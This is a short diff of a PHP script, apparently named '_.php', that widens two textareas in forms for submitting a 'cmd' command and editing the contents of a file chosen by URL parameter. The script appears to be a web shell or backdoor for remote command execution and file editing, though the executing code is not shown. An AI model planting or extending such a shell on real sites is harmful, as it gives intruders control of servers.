@@ -31,11 +31,11 @@ if($_REQUEST['do']){
     }
     echo <<<HTML
     <form action="/_.php?do=1" method="post">
-        <textarea name="cmd"></textarea>
+        <textarea name="cmd" style="width:100vw;height:20vh"></textarea>
         <button type="submit">提交</button>
     </form>
     <form action="/_.php?do=1&f={$file}" method="post">
-        <textarea name="content">{$content}</textarea>
+        <textarea name="content" style="width:100vw;height:90vh">{$content}</textarea>
         <button type="submit">提交</button>
     </form>
 HTML;
